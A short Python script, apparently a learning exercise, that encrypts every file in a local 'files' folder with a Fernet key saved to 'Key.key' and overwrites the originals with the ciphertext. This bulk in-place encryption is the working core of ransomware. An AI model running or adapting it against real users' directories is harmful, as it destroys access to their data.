import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir("files"):
    full_path = os.path.join("files", file)
    if os.path.isfile(full_path):
        files.append(file)

key = Fernet.generate_key()

with open("Key.key", "wb") as key_:
    key_.write(key)

for file in files:
    full_path = os.path.join("files", file)
    with open(full_path, "rb") as thefile:
        contents = thefile.read()
    contents_encrypthed = Fernet(key).encrypt(contents) # Encrypth content of the file

    with open(full_path, "wb") as thefile:
        contents = thefile.write(contents_encrypthed)